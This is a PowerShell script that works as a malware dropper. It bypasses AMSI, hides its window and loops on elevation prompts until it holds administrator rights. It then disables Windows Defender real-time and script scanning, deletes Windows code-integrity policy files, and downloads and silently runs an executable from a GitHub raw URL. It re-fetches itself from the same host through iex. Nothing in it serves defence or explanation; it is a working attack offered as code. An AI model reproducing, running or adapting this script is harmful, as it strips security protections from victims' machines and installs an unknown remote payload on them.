# ===== 1. AMSI KILL (must be first, wrapped so it never throws) =====
try { [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) } catch {}

# ===== 2. HIDE WINDOW (wrapped) =====
try {
    Add-Type -Name W -Namespace C -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();[DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr h,int c);' -ErrorAction SilentlyContinue
    $w = [C.W]::GetConsoleWindow()
    if ($w -ne [IntPtr]::Zero) { [C.W]::ShowWindow($w, 0) | Out-Null }
} catch {}

# ===== 3. SELF-URL + ADMIN CHECK =====
$self = "https://github.com/analysisw/test/raw/refs/heads/main/teest.ps1"
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# ===== 4. RELAUNCH TARGET with AMSI patch inside =====
$patch = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue(`$null,`$true)"
$relaunch = if ($PSCommandPath) { "-File `"$PSCommandPath`"" } else { "-c $patch;iex((New-Object Net.WebClient).DownloadString('$self'))" }

# ===== 5. ELEVATION LOOP (infinite, silent, retry until admin) =====
while (-not $isAdmin) {
    try {
        Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass $relaunch" -ErrorAction Stop
        break
    } catch {
        Start-Sleep -Seconds 2
    }
}

if (-not $isAdmin) { exit }

# ===== 6. ADMIN WORK (everything silent, zero output) =====
try {
    try { Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue } catch {}
    try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } catch {}
    try { Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue } catch {}
    try { Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue } catch {}

    try { Remove-Item -LiteralPath "$((Get-Partition | ? IsSystem).AccessPaths[0])Microsoft\Boot\WiSiPolicy.p7b" -Force -ErrorAction SilentlyContinue } catch {}
    try { Remove-Item -LiteralPath "$env:windir\System32\CodeIntegrity\WiSiPolicy.p7b" -Force -ErrorAction SilentlyContinue } catch {}
    try { Remove-Item -LiteralPath "$env:windir\Boot\EFI\wisipolicy.p7b" -Force -ErrorAction SilentlyContinue } catch {}
    try { Remove-Item -Path "$env:windir\WinSxS" -Include *winsipolicy.p7b* -Recurse -Force -ErrorAction SilentlyContinue } catch {}

    $folder = $env:TEMP
    try { Add-MpPreference -ExclusionPath $folder -ErrorAction SilentlyContinue } catch {}

    try {
        Invoke-WebRequest -Uri "https://github.com/analysisw/test/raw/refs/heads/main/helloworldd.exe" -OutFile "$folder\helloworldd.exe" -ErrorAction SilentlyContinue
    } catch {}
    try {
        Start-Process -FilePath "$folder\helloworldd.exe" -WindowStyle Hidden
    } catch {}
} catch {}
